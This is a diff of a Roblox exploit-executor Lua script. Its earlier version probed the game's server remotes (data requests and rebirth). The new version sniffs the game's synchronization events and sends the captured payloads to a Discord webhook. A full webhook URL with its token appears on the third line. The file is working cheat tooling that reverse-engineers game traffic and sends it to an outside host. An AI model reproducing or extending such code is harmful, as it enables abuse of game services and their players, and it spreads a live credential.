@@ -1,45 +1,37 @@
--- probe2.lua
+-- stat_sniffer.lua
 local WEBHOOK = "https://discord.com/api/webhooks/1573296342854410384/3Nfz9qxVONkZl1jZADGMzCN6buVXkKydQgc8vNwIHjwhDvYsffo4BWcoe3UU1fI86CNf"
 local http = request or http_request or (syn and syn.request)
 local HttpService = game:GetService("HttpService")
+
 local function post(c)
-    for i = 1, #c, 1900 do
-        pcall(function()
-            http({ Url = WEBHOOK, Method = "POST",
-                Headers = { ["Content-Type"] = "application/json" },
-                Body = HttpService:JSONEncode({ content = c:sub(i, i + 1899) }) })
-        end)
-        task.wait(1)
-    end
+    pcall(function()
+        http({ Url = WEBHOOK, Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode({ content = c:sub(1, 1900) }) })
+    end)
 end
 
+post("SNIFFER STARTED. Waiting for server data...")
+
 local Net = game:GetService("ReplicatedStorage").Packages.Net
-local Sync = Net:WaitForChild("RF/Synchronizer/RequestData")
-local Comm = Net:WaitForChild("RE/Synchronizer/CommunicationRoute")
-local Reb = Net:WaitForChild("RF/Rebirth/RequestRebirth")
+local Comm = Net:FindFirstChild("RE/Synchronizer/CommunicationRoute")
 
-local captured = {}
+if not Comm then
+    post("ERROR: Could not find CommunicationRoute")
+    return
+end
 
+local captured = 0
 Comm.OnClientEvent:Connect(function(...)
+    if captured >= 3 then return end -- only capture the first 3 updates so Discord isn't spammed
+    captured = captured + 1
+    
     local args = {...}
     local parts = {}
     for i, v in ipairs(args) do
         local ok, enc = pcall(function() return HttpService:JSONEncode(v) end)
         parts[i] = ok and enc or tostring(v)
     end
-    table.insert(captured, "COMM: " .. table.concat(parts, " | "))
+    
+    post("STAT UPDATE " .. captured .. ":\n" .. table.concat(parts, " | "))
 end)
-
--- Try RequestData with no arg
-pcall(function() Sync:InvokeServer() end)
-task.wait(2)
-
--- Try RequestData with string arg
-pcall(function() Sync:InvokeServer("All") end)
-task.wait(2)
-
--- Try rebirth, capture any response event
-pcall(function() Reb:InvokeServer() end)
-task.wait(2)
-
-post("CAPTURED " .. #captured .. " events\n" .. table.concat(captured, "\n"))
